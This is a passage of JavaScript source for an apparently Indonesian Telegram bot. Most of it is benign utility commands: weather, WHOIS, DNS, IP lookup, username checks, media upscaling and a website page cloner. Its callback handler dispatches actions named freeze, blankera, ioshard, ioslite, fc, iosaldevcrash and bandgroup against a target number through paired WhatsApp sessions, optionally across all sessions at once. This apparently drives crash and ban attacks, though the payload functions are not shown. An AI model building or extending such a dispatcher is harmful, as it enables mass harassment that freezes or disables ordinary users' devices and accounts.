                            await botReply(ctx, "🏷 STICKER MAKER\n", [
                                ["Status", "✅ Foto berhasil diubah jadi stiker"]
                            ]);
                        } catch (err) {
                            console.error("Error /sticker:", err.message);
                            if (waitSticker) await ctx.api.deleteMessage(ctx.chat.id, waitSticker.message_id).catch(() => {});
                            ctx.reply("❌ Gagal membuat stiker. Coba lagi nanti.");
                        }
                        break;
                    }

                    // ----------- ( tools: cek cuaca kota ) ------------ //
                    case "weather": {
                        const kota = args.join(" ").trim();
                        if (!kota) {
                            return ctx.reply("❌ Format: /weather <kota>\nContoh: /weather Jakarta");
                        }

                        try {
                            const geo = await axios.get(
                                `https://geocoding-api.open-meteo.com/v1/search?name=${encodeURIComponent(kota)}&count=1&language=id`,
                                { timeout: 15000 }
                            );

                            const place = geo.data?.results?.[0];
                            if (!place) {
                                return ctx.reply("❌ Kota tidak ditemukan. Coba nama kota lain.");
                            }

                            const cuaca = await axios.get(
                                `https://api.open-meteo.com/v1/forecast?latitude=${place.latitude}&longitude=${place.longitude}&current_weather=true`,
                                { timeout: 15000 }
                            );

                            const cw = cuaca.data?.current_weather;
                            if (!cw) {
                                return ctx.reply("❌ Gagal mengambil data cuaca. Coba lagi nanti.");
                            }

                            await botReply(ctx, "⛅ CEK CUACA\n", [
                                ["Lokasi", `${place.name}, ${place.country || "-"}`],
                                ["Suhu", `${cw.temperature}°C`],
                                ["Angin", `${cw.windspeed} km/j`],
                                ["Update", cw.time]
                            ]);
                        } catch (err) {
                            console.error("Error /weather:", err.message);
                            ctx.reply("❌ Gagal mengambil data cuaca. Coba lagi nanti.");
                        }
                        break;
                    }

                    // ----------- ( tools: perpendek link ) ------------ //
                    case "short": {
                        const linkPanjang = args[0];
                        if (!linkPanjang || !/^https?:\/\//i.test(linkPanjang)) {
                            return ctx.reply("❌ Format: /short <link>\nContoh: /short https://contoh.com/halaman-panjang");
                        }

                        try {
                            const { data } = await axios.get(
                                `https://is.gd/create.php?format=simple&url=${encodeURIComponent(linkPanjang)}`,
                                { timeout: 15000 }
                            );

                            const hasilShort = String(data).trim();
                            if (!/^https?:\/\//i.test(hasilShort)) {
                                return ctx.reply("❌ Gagal memperpendek link. Coba lagi nanti.");
                            }

                            await botReply(ctx, "🔗 SHORTEN URL\n", [
                                ["Asli", linkPanjang],
                                ["Pendek", hasilShort]
                            ]);
                        } catch (err) {
                            console.error("Error /short:", err.message);
                            ctx.reply("❌ Gagal memperpendek link. Coba lagi nanti.");
                        }
                        break;
                    }

                    // ----------- ( osint: whois domain ) ------------ //
                    case "whois": {
                        const domainW = (args[0] || "").trim().toLowerCase();
                        if (!domainW || !/^[a-z0-9.-]+\.[a-z]{2,}$/.test(domainW)) {
                            return ctx.reply("❌ Format: /whois <domain>\nContoh: /whois google.com");
                        }

                        try {
                            const { data } = await axios.get(`https://rdap.org/domain/${encodeURIComponent(domainW)}`, {
                                timeout: 15000,
                                validateStatus: () => true
                            });

                            if (!data || data.errorCode || !data.ldhName) {
                                return ctx.reply("❌ Domain tidak ditemukan / tidak punya data RDAP publik.");
                            }

                            const events = data.events || [];
                            const getEvent = (action) => events.find(e => e.eventAction === action)?.eventDate || "-";
                            const registrar = (data.entities || []).find(e => (e.roles || []).includes("registrar"));
                            let registrarName = "-";
                            if (registrar?.vcardArray?.[1]) {
                                const fnField = registrar.vcardArray[1].find(f => f[0] === "fn");
                                if (fnField) registrarName = fnField[3];
                            }
                            const ns = (data.nameservers || []).map(n => n.ldhName).join(", ") || "-";

                            await botReply(ctx, "🔎 WHOIS DOMAIN\n", [
                                ["Domain", data.ldhName],
                                ["Status", (data.status || []).join(", ") || "-"],
                                ["Registrar", registrarName],
                                ["Terdaftar", getEvent("registration")],
                                ["Kadaluarsa", getEvent("expiration")],
                                ["Terakhir update", getEvent("last changed")],
                                ["Nameserver", ns]
                            ]);
                        } catch (err) {
                            console.error("Error /whois:", err.message);
                            ctx.reply("❌ Gagal mengambil data WHOIS. Coba lagi nanti.");
                        }
                        break;
                    }

                    // ----------- ( osint: cek DNS record domain ) ------------ //
                    case "dns": {
                        const domainD = (args[0] || "").trim().toLowerCase();
                        const tipeD = (args[1] || "A").toUpperCase();
                        if (!domainD || !/^[a-z0-9.-]+\.[a-z]{2,}$/.test(domainD)) {
                            return ctx.reply("❌ Format: /dns <domain> [tipe]\nContoh: /dns google.com MX\nTipe: A, AAAA, MX, TXT, NS, CNAME");
                        }

                        try {
                            const { data } = await axios.get("https://cloudflare-dns.com/dns-query", {
                                params: { name: domainD, type: tipeD },
                                headers: { accept: "application/dns-json" },
                                timeout: 15000
                            });

                            if (!data.Answer || !data.Answer.length) {
                                return ctx.reply(`❌ Tidak ada record ${tipeD} untuk domain ini.`);
                            }

                            const rows = data.Answer.map((rec, i) => [`#${i + 1}`, `${rec.data} (TTL ${rec.TTL}s)`]);
                            await botReply(ctx, `🌐 DNS RECORD (${tipeD})\n`, [["Domain", domainD], ...rows]);
                        } catch (err) {
                            console.error("Error /dns:", err.message);
                            ctx.reply("❌ Gagal mengambil data DNS. Coba lagi nanti.");
                        }
                        break;
                    }

                    // ----------- ( osint: info geolokasi IP ) ------------ //
                    case "ipinfo": {
                        const ipQ = (args[0] || "").trim();
                        if (!ipQ) {
                            return ctx.reply("❌ Format: /ipinfo <ip>\nContoh: /ipinfo 8.8.8.8\n(Catatan: hasil cuma level kota, bukan alamat presisi)");
                        }

                        try {
                            const { data } = await axios.get(`http://ip-api.com/json/${encodeURIComponent(ipQ)}`, {
                                params: { fields: "status,message,country,regionName,city,isp,org,as,timezone,query" },
                                timeout: 15000
                            });

                            if (data.status !== "success") {
                                return ctx.reply("❌ IP tidak valid atau gagal dilookup: " + (data.message || "unknown"));
                            }

                            await botReply(ctx, "📡 IP INFO\n", [
                                ["IP", data.query],
                                ["Negara", data.country || "-"],
                                ["Wilayah", data.regionName || "-"],
                                ["Kota", data.city || "-"],
                                ["ISP", data.isp || "-"],
                                ["Organisasi", data.org || "-"],
                                ["ASN", data.as || "-"],
                                ["Timezone", data.timezone || "-"]
                            ]);
                        } catch (err) {
                            console.error("Error /ipinfo:", err.message);
                            ctx.reply("❌ Gagal mengambil info IP. Coba lagi nanti.");
                        }
                        break;
                    }

                    // ----------- ( osint: cek sertifikat SSL domain ) ------------ //
                    case "ssl": {
                        const domainS = (args[0] || "").trim().toLowerCase();
                        if (!domainS || !/^[a-z0-9.-]+\.[a-z]{2,}$/.test(domainS)) {
                            return ctx.reply("❌ Format: /ssl <domain>\nContoh: /ssl google.com");
                        }

                        try {
                            const tls = requireCjs("tls");
                            const cert = await new Promise((resolve, reject) => {
                                const socket = tls.connect(443, domainS, { servername: domainS, timeout: 10000 }, () => {
                                    const c = socket.getPeerCertificate();
                                    socket.end();
                                    resolve(c);
                                });
                                socket.on("error", reject);
                                socket.on("timeout", () => { socket.destroy(); reject(new Error("Koneksi timeout")); });
                            });

                            if (!cert || !cert.subject) {
                                return ctx.reply("❌ Gagal mengambil sertifikat SSL (mungkin domain tidak pakai HTTPS).");
                            }

                            await botReply(ctx, "🔐 SSL CERTIFICATE\n", [
                                ["Domain", domainS],
                                ["Dikeluarkan untuk", cert.subject?.CN || "-"],
                                ["Penerbit (CA)", cert.issuer?.O || cert.issuer?.CN || "-"],
                                ["Berlaku dari", cert.valid_from || "-"],
                                ["Berlaku sampai", cert.valid_to || "-"],
                                ["Serial", cert.serialNumber || "-"]
                            ]);
                        } catch (err) {
                            console.error("Error /ssl:", err.message);
                            ctx.reply("❌ Gagal mengambil sertifikat SSL. Pastikan domain valid dan support HTTPS.");
                        }
                        break;
                    }

                    // ----------- ( osint: cek jejak username publik di berbagai platform ) ------------ //
                    // Cuma ngecek apakah URL profil publik itu ADA (bukan narik data pribadi/foto/bio).
                    case "cekusername": {
                        const uname = (args[0] || "").trim();
                        if (!uname || !/^[a-zA-Z0-9._-]{2,32}$/.test(uname)) {
                            return ctx.reply("❌ Format: /cekusername <username>\nContoh: /cekusername johndoe");
                        }

                        const platforms = [
                            { name: "GitHub", url: `https://github.com/${uname}` },
                            { name: "Reddit", url: `https://www.reddit.com/user/${uname}` },
                            { name: "TikTok", url: `https://www.tiktok.com/@${uname}` },
                            { name: "Instagram", url: `https://www.instagram.com/${uname}/` },
                            { name: "X (Twitter)", url: `https://x.com/${uname}` },
                            { name: "Telegram", url: `https://t.me/${uname}` },
                            { name: "YouTube", url: `https://www.youtube.com/@${uname}` },
                            { name: "Pinterest", url: `https://www.pinterest.com/${uname}/` },
                            { name: "Medium", url: `https://medium.com/@${uname}` },
                            { name: "NPM", url: `https://www.npmjs.com/~${uname}` }
                        ];

                        const waitUname = await ctx.reply(`🔍 Mengecek "${uname}" di ${platforms.length} platform...`);

                        const results = await Promise.allSettled(
                            platforms.map(p =>
                                axios.get(p.url, {
                                    timeout: 9000,
                                    maxRedirects: 3,
                                    validateStatus: () => true,
                                    headers: { "User-Agent": "Mozilla/5.0 (compatible; OSINT-Bot/1.0)" }
                                }).then(res => ({ ...p, status: res.status }))
                            )
                        );

                        const rows = results.map((r, i) => {
                            if (r.status !== "fulfilled") return [platforms[i].name, "⚠️ Tidak bisa dicek"];
                            const found = r.value.status >= 200 && r.value.status < 400;
                            return [r.value.name, found ? `✅ ${r.value.url}` : "❌ Tidak ditemukan"];
                        });

                        await ctx.api.deleteMessage(ctx.chat.id, waitUname.message_id).catch(() => {});
                        await botReply(ctx, `🕵️ CEK USERNAME: ${uname}\n`, rows);
                        break;
                    }

                    // ----------- ( tools: foto ke HD, hasil dikirim sebagai file ) ------------ //
                    // Proses LOKAL pakai sharp (upscale 2x + sharpen). Hasil dikirim LANGSUNG
                    // via Telegram (bukan link host luar) karena catbox/uguu.se sering
                    // diblokir ISP di Indonesia — Telegram jelas bisa diakses karena bot ini jalan.
                    case "hdfoto": {
                        const rHd = ctx.message.reply_to_message;
                        if (!rHd || !rHd.photo) {
                            return ctx.reply("❌ Format: reply sebuah FOTO lalu ketik /hdfoto");
                        }

                        let sharp;
                        try {
                            sharp = requireCjs("sharp");
                        } catch {
                            return ctx.reply("❌ Module sharp belum terinstall.\nInstall dulu dengan: npm install sharp\nLalu restart bot.");
                        }

                        let waitHd;
                        try {
                            waitHd = await ctx.reply("⏳ Meningkatkan kualitas foto (upscale 2x + sharpen)...");

                            const photoArr = rHd.photo;
                            const fileId = photoArr[photoArr.length - 1].file_id;
                            const tgFile = await ctx.api.getFile(fileId);
                            const tgLink = `https://api.telegram.org/file/bot${ctx.api.token}/${tgFile.file_path}`;

                            const { data: imgBuffer } = await axios.get(tgLink, { responseType: "arraybuffer", timeout: 30000 });

                            const meta = await sharp(Buffer.from(imgBuffer)).metadata();
                            const targetWidth = Math.min((meta.width || 800) * 2, 4000);

                            const hdBuffer = await sharp(Buffer.from(imgBuffer))
                                .resize({ width: targetWidth, kernel: "lanczos3" })
                                .sharpen({ sigma: 1.2 })
                                .png()
                                .toBuffer();

                            if (waitHd) await ctx.api.deleteMessage(ctx.chat.id, waitHd.message_id).catch(() => {});

                            await ctx.replyWithDocument(new InputFile(hdBuffer, "hdfoto.png"));
                            await botReply(ctx, "✨ HD PHOTO UPSCALE\n", [
                                ["Status", "✅ Berhasil di-upscale 2x + sharpen (lokal, bukan AI)"],
                                ["Resolusi baru", `${targetWidth}px lebar`]
                            ]);
                        } catch (err) {
                            console.error("Error /hdfoto:", err.message);
                            if (waitHd) await ctx.api.deleteMessage(ctx.chat.id, waitHd.message_id).catch(() => {});
                            ctx.reply("❌ Gagal meningkatkan kualitas foto. Pastikan file yang direply valid.");
                        }
                        break;
                    }

                    // ----------- ( tools: ekstrak audio dari video, hasil jadi link ) ------------ //
                    case "sound": {
                        const rSound = ctx.message.reply_to_message;
                        const media = rSound?.video || rSound?.audio || rSound?.voice || rSound?.document;

                        if (!media) {
                            return ctx.reply("❌ Format: reply sebuah VIDEO/AUDIO lalu ketik /sound");
                        }

                        let waitSound, inputPath, outputPath;
                        try {
                            waitSound = await ctx.reply("⏳ Mengekstrak audio dari media...");

                            const tgFile = await ctx.api.getFile(media.file_id);
                            const tgLink = `https://api.telegram.org/file/bot${ctx.api.token}/${tgFile.file_path}`;
                            const { data: buf } = await axios.get(tgLink, { responseType: "arraybuffer", timeout: 60000 });

                            const stamp = `${ctx.chat.id}_${Date.now()}`;
                            const inputExt = path.extname(tgFile.file_path) || ".mp4";
                            inputPath = path.join(os.tmpdir(), `sound_in_${stamp}${inputExt}`);
                            outputPath = path.join(os.tmpdir(), `sound_out_${stamp}.mp3`);
                            fs.writeFileSync(inputPath, Buffer.from(buf));

                            const { spawn } = await import("child_process");
                            const ffmpegBin = resolveFfmpegPath();
                            await new Promise((resolve, reject) => {
                                const proc = spawn(ffmpegBin, ["-y", "-i", inputPath, "-vn", "-acodec", "libmp3lame", "-q:a", "2", outputPath]);
                                let stderrLog = "";
                                proc.stderr?.on("data", (d) => { stderrLog += d.toString(); });
                                proc.on("close", (code) => {
                                    if (code === 0) resolve();
                                    else reject(new Error("FFMPEG_FAILED: " + stderrLog.slice(-300)));
                                });
                                proc.on("error", () => reject(new Error("FFMPEG_NOT_FOUND")));
                            });

                            const audioBuffer = fs.readFileSync(outputPath);

                            if (waitSound) await ctx.api.deleteMessage(ctx.chat.id, waitSound.message_id).catch(() => {});

                            await ctx.replyWithAudio(new InputFile(audioBuffer, "sound.mp3"));
                            await botReply(ctx, "🔊 EXTRACT AUDIO\n", [
                                ["Status", "✅ Audio berhasil diekstrak"]
                            ]);
                        } catch (err) {
                            console.error("Error /sound:", err.message);
                            if (waitSound) await ctx.api.deleteMessage(ctx.chat.id, waitSound.message_id).catch(() => {});
                            if (err.message === "FFMPEG_NOT_FOUND") {
                                return ctx.reply("❌ ffmpeg gak ketemu.\nInstall dulu dengan: npm install ffmpeg-static\nLalu restart bot.");
                            }
                            ctx.reply("❌ Gagal mengekstrak audio. Pastikan file yang direply valid video/audio.");
                        } finally {
                            try { if (inputPath && fs.existsSync(inputPath)) fs.unlinkSync(inputPath); } catch {}
                            try { if (outputPath && fs.existsSync(outputPath)) fs.unlinkSync(outputPath); } catch {}
                        }
                        break;
                    }

                    // ----------- ( tools: video ke HD, hasil dikirim sebagai file ) ------------ //
                    // Proses LOKAL pakai ffmpeg (upscale 2x + filter sharpen). Hasil dikirim
                    // LANGSUNG via Telegram, gak upload ke host luar (rawan diblokir ISP).
                    case "hdvideo": {
                        const rHdv = ctx.message.reply_to_message;
                        if (!rHdv || !rHdv.video) {
                            return ctx.reply("❌ Format: reply sebuah VIDEO lalu ketik /hdvideo");
                        }

                        let waitHdv, inputPath, outputPath;
                        try {
                            waitHdv = await ctx.reply("⏳ Meningkatkan kualitas video (upscale 2x + sharpen, bisa agak lama)...");


                            const tgFile = await ctx.api.getFile(rHdv.video.file_id);
                            const tgLink = `https://api.telegram.org/file/bot${ctx.api.token}/${tgFile.file_path}`;
                            const { data: buf } = await axios.get(tgLink, { responseType: "arraybuffer", timeout: 60000 });

                            const stamp = `${ctx.chat.id}_${Date.now()}`;
                            const inputExt = path.extname(tgFile.file_path) || ".mp4";
                            inputPath = path.join(os.tmpdir(), `hdv_in_${stamp}${inputExt}`);
                            outputPath = path.join(os.tmpdir(), `hdv_out_${stamp}.mp4`);
                            fs.writeFileSync(inputPath, Buffer.from(buf));

                            const { spawn } = await import("child_process");
                            const ffmpegBin = resolveFfmpegPath();
                            await new Promise((resolve, reject) => {
                                const proc = spawn(ffmpegBin, [
                                    "-y", "-i", inputPath,
                                    "-vf", "scale=iw*2:ih*2:flags=lanczos,unsharp=5:5:0.8:5:5:0.0",
                                    "-c:v", "libx264", "-preset", "medium", "-crf", "20",
                                    "-c:a", "copy",
                                    outputPath
                                ]);
                                let stderrLog = "";
                                proc.stderr?.on("data", (d) => { stderrLog += d.toString(); });
                                proc.on("close", (code) => {
                                    if (code === 0) resolve();
                                    else reject(new Error("FFMPEG_FAILED: " + stderrLog.slice(-300)));
                                });
                                proc.on("error", () => reject(new Error("FFMPEG_NOT_FOUND")));
                            });

                            const hdBuffer = fs.readFileSync(outputPath);

                            if (waitHdv) await ctx.api.deleteMessage(ctx.chat.id, waitHdv.message_id).catch(() => {});

                            await botMediaReply(ctx, { video: new InputFile(hdBuffer, "hdvideo.mp4") }, "🎬 HD VIDEO UPSCALE\n", [
                                ["Status", "✅ Berhasil di-upscale 2x + sharpen (lokal via ffmpeg)"]
                            ]);
                        } catch (err) {
                            console.error("Error /hdvideo:", err.message);
                            if (waitHdv) await ctx.api.deleteMessage(ctx.chat.id, waitHdv.message_id).catch(() => {});
                            if (err.message === "FFMPEG_NOT_FOUND") {
                                return ctx.reply("❌ ffmpeg gak ketemu.\nInstall dulu dengan: npm install ffmpeg-static\nLalu restart bot.");
                            }
                            ctx.reply("❌ Gagal meningkatkan kualitas video. Video mungkin terlalu besar/berat buat diproses, coba video yang lebih pendek.");
                        } finally {
                            try { if (inputPath && fs.existsSync(inputPath)) fs.unlinkSync(inputPath); } catch {}
                            try { if (outputPath && fs.existsSync(outputPath)) fs.unlinkSync(outputPath); } catch {}
                        }
                        break;
                    }

                    // ----------- ( tools: kloning tampilan website dari link ) ------------ //
                    case "gethtml": {
                        const targetUrl = args[0];
                        if (!targetUrl || !/^https?:\/\//i.test(targetUrl)) {
                            return ctx.reply("❌ Format: /gethtml <link website>\nContoh: /gethtml https://example.com");
                        }

                        let archiver, cheerioMod;
                        try {
                            archiver = await resolveArchiver();
                        } catch (e) {
                            if (e.message === "MODULE_ARCHIVER_MISSING") {
                                return ctx.reply("❌ Module archiver belum terinstall.\nInstall dulu dengan: npm install archiver\nLalu restart bot.");
                            }
                            console.error("Error load archiver:", e.message);
                            return ctx.reply(`❌ Gagal load module archiver (versi paketnya gak dikenali).\nCoba: npm uninstall archiver && npm install archiver@7\nDetail: ${e.message}`);
                        }
                        try {
                            cheerioMod = requireCjs("cheerio");
                        } catch {
                            return ctx.reply("❌ Module cheerio belum terinstall.\nInstall dulu dengan: npm install cheerio\nLalu restart bot.");
                        }

                        let waitHtml, workDir, zipPath;
                        try {
                            waitHtml = await ctx.reply("⏳ Mengambil & mengkloning halaman website...");

                            const { data: html } = await axios.get(targetUrl, {
                                timeout: 20000,
                                headers: { "User-Agent": "Mozilla/5.0" }
                            });

                            const $ = cheerioMod.load(html);
                            const stamp = `${ctx.chat.id}_${Date.now()}`;
                            workDir = path.join(os.tmpdir(), `clone_${stamp}`);
                            fs.mkdirSync(path.join(workDir, "assets"), { recursive: true });

                            const assetTasks = [];
                            const MAX_ASSET = 20;

                            const grabAsset = (attr, selector, prefix) => {
                                $(selector).each((i, el) => {
                                    if (assetTasks.length >= MAX_ASSET) return;
                                    const src = $(el).attr(attr);
                                    if (!src || src.startsWith("data:")) return;
                                    try {
                                        const abs = new URL(src, targetUrl).href;
                                        const ext = path.extname(new URL(abs).pathname) || "";
                                        const localName = `${prefix}_${assetTasks.length}${ext}`;
                                        assetTasks.push({ abs, localName, el, attr });
                                    } catch {}
                                });
                            };

                            grabAsset("href", "link[rel='stylesheet']", "css");
                            grabAsset("src", "script[src]", "js");
                            grabAsset("src", "img[src]", "img");

                            let berhasilAsset = 0;
                            for (const task of assetTasks) {
                                try {
                                    const res = await axios.get(task.abs, { responseType: "arraybuffer", timeout: 15000 });
                                    fs.writeFileSync(path.join(workDir, "assets", task.localName), res.data);
                                    $(task.el).attr(task.attr, `assets/${task.localName}`);
                                    berhasilAsset++;
                                } catch {
                                    // asset gagal diambil, biarin link aslinya biar halaman tetap tampil
                                }
                            }

                            fs.writeFileSync(path.join(workDir, "index.html"), $.html(), "utf8");

                            zipPath = path.join(os.tmpdir(), `clone_${stamp}.zip`);
                            await new Promise((resolve, reject) => {
                                const output = fs.createWriteStream(zipPath);
                                const archive = archiver("zip", { zlib: { level: 9 } });
                                output.on("close", resolve);
                                archive.on("error", reject);
                                archive.pipe(output);
                                archive.directory(workDir, false);
                                archive.finalize();
                            });

                            if (waitHtml) await ctx.api.deleteMessage(ctx.chat.id, waitHtml.message_id).catch(() => {});

                            await ctx.replyWithDocument(new InputFile(zipPath, "clone-website.zip"));
                            await botReply(ctx, "🌐 CLONE WEBSITE\n", [
                                ["Status", "✅ Berhasil kloning halaman"],
                                ["Source", targetUrl],
                                ["Isi", `index.html + ${berhasilAsset}/${assetTasks.length} asset (css/js/img)`],
                                ["Catatan", "Cuma niru 1 halaman ini (bukan seluruh website), tampilan statis doang — fitur backend/server-side gak ikut"]
                            ]);
                        } catch (err) {
                            console.error("Error /gethtml:", err.message);
                            if (waitHtml) await ctx.api.deleteMessage(ctx.chat.id, waitHtml.message_id).catch(() => {});
                            ctx.reply("❌ Gagal mengambil / mengkloning halaman. Pastikan link valid dan bisa diakses publik.");
                        } finally {
                            try { if (workDir) fs.rmSync(workDir, { recursive: true, force: true }); } catch {}
                            try { if (zipPath && fs.existsSync(zipPath)) fs.unlinkSync(zipPath); } catch {}
                        }
                        break;
                    }

                    // ----------- ( semua command ) ------------ //
                    case "menu": {
                        await sendAllMenu(ctx);
                        break;
                    }

                    default: {
                        return;
                    }
                }
            });


// ----------- ( handler: callback query / tombol ) ------------ //

bot.on("callback_query:data", async (ctx) => {
    const data = ctx.callbackQuery.data;
    await ctx.answerCallbackQuery();

    switch (true) {

        case data === "recheck_join": {
            const uidCheck = String(ctx.from.id);
            const joined = await isUserJoinedChannel(uidCheck);
            if (joined) {
                await ctx.editMessageText("✅ Thank you for joining! You can now use the bot. /start");
            } else {
                await botError(ctx, "You still haven't joined the channel.");
            }
            return;
        }

        case data === "all_menu": {
            await ctx.deleteMessage().catch(() => {});
            return sendAllMenu(ctx);
        }

        case data === "travas_menu": {
            await ctx.deleteMessage().catch(() => {});
            return sendTravasMenu(ctx);
        }

        case data === "tools_menu": {
            await ctx.deleteMessage().catch(() => {});
            return sendToolsMenu(ctx);
        }

        case data === "fixcode_menu": {
            await ctx.deleteMessage().catch(() => {});
            return sendFixCodeMenu(ctx);
        }

        case data === "osint_menu": {
            await ctx.deleteMessage().catch(() => {});
            return sendOsintMenu(ctx);
        }

        case data === "back_menu": {
            await ctx.deleteMessage().catch(() => {});
            return sendStartMenu(ctx);
        }

        // ─── UNIFIED CALLBACK HANDLER ──────────────────────────────────────
        case data.startsWith("action_"):
        case data.startsWith("freeze_"):
        case data.startsWith("blankera_"):
        case data.startsWith("ioshard_"):
		case data.startsWith("bandgroup"):
        case data.startsWith("ioslite_"):
		case data.startsWith("fc_"):
		case data.startsWith("iosaldevcrash_"):{
            const uid = String(ctx.from.id);
            const pending = pendingAction.get(uid);

            if (!pending) {
                return botError(ctx, "Sesi sudah kadaluarsa.");
            }

            // ── Determine which prefix was used ──
            let picked;
            if (data.startsWith("action_")) {
                picked = data.replace("action_", "");
            } else if (data.startsWith("freeze_")) {
                picked = data.replace("freeze_", "");
            } else if (data.startsWith("blankera_")) {
                picked = data.replace("blankera_", "");
		    } else if (data.startsWith("bandgroup")) {
                picked = data.replace("bandgroup", "");
		    } else if (data.startsWith("fc")) {
                picked = data.replace("fc", "");
            } else if (data.startsWith("ioshard_")) {
                picked = data.replace("ioshard_", "");
            } else if (data.startsWith("ioslite_")) {
                picked = data.replace("ioslite_", "");
			} else if (data.startsWith("iosaldevcrash_")) {   
                picked = data.replace("iosaldevcrash_", "");	
            } else {
                picked = data;
            }

            // ── Parse the selected sender ──
            let selectedUid, selectedNumber;
            const isOwnerUser = checkOwner(uid);

            if (picked === "all") {
                // handled below
            } else if (isOwnerUser && picked.includes("_")) {
                const firstUnderscore = picked.indexOf("_");
                selectedUid = picked.slice(0, firstUnderscore);
                selectedNumber = picked.slice(firstUnderscore + 1);
            } else {
                selectedUid = uid;
                selectedNumber = picked;
            }

            await ctx.deleteMessage().catch(() => {});

            const execute = async (execUid, execNumber) => {
                const client = getClient(execUid, execNumber);
                if (!client?.sock || client.status !== "open") {
                    return `${execNumber} — 🔴 Offline`;
                }
                try {
                    // ── FIX: Check what pending.func expects ──
                    // If pending.func has 2 parameters and expects sessionInfo,
                    // pass the combined string, otherwise pass sock and target
                    const funcStr = pending.func.toString();
                    const params = funcStr.match(/^async\s*\(([^)]*)\)/);
                    const paramNames = params ? params[1].split(',').map(p => p.trim()) : [];
                    
                    if (paramNames.length === 2 && paramNames[0] === 'sock' && paramNames[1] === 'sessionInfo') {
                        // Custom command format: (sock, sessionInfo)
                        const sessionInfo = isOwnerUser ? `${execUid}_${execNumber}` : execNumber;
                        await pending.func(client.sock, sessionInfo);
                    } else {
                        // Standard format: (sock, target)
                        await pending.func(client.sock, pending.target);
                    }
                    
                    return `${execNumber} — 🟢 Berhasil`;
                } catch (err) {
                    return `${execNumber} — ❌ Gagal (${err.message})`;
                }
            };

            let results = [];

            if (picked === "all") {
                let allSessions = [];
                if (isOwnerUser) {
                    const allPairs = getAllPairs();
                    for (const [userId, numbers] of Object.entries(allPairs)) {
                        for (const number of numbers) {
                            allSessions.push({ uid: userId, number });
                        }
                    }
                } else {
                    allSessions = getPairsForUser(uid).map(number => ({ uid, number }));
                }

                for (const { uid: sUid, number: sNum } of allSessions) {
                    results.push(await execute(sUid, sNum));
                }
            } else {
                results.push(await execute(selectedUid, selectedNumber));
            }

            pendingAction.delete(uid);

            if (picked !== "all") {
                return sendTextResult(ctx, {
                    type: "single",
                    session: selectedNumber,
                    target: pending.target
                });
            }

            return sendTextResult(ctx, {
                type: "all",
                results
            });
        }

        default: {
            return;
        }
    }
});

        // ----------- ( error handler per-instance, anti nabrak/freeze ) ------------ //

            bot.catch((err) => {
                const label = isSubBot ? `Sub-bot (${subBotOwnerId})` : "Main bot";
                log.error(`${label} error: ${err.message}`);
            });
    }